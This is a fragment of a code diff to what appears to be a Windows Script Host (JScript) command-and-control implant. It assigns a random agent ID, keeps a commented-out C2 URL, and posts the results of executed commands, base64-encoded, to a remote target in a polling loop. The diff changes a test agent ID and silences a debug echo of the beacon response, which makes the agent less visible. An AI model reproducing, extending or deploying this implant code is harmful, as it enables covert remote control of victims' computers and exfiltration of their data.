@@ -12,7 +12,7 @@ var xFrameOptions = "SAMEORIGIN";
 var contentEncoding = "gzip";
 var contentType = "text/xml";
 var agentid = Math.floor(Math.random() * 99999999).toString();
-//agentid = "24463333";
+//agentid = "24463335";
 //WScript.Echo(agentid);
 //var c2url = "http://ssppayments.com/c2.html";
 
@@ -141,7 +141,7 @@ while(true)
       var resp = '{"type":"r","agentid": ' + agentid + ',"taskid":"1","cmd":"' + jsObject.cmd + '","retval":"' + base64Encode(retval) + '"}';
 
       curcmd = jsondata;
-      WScript.Echo(resp);
+      //WScript.Echo(resp);
       webPost(target, resp);
     }
   }
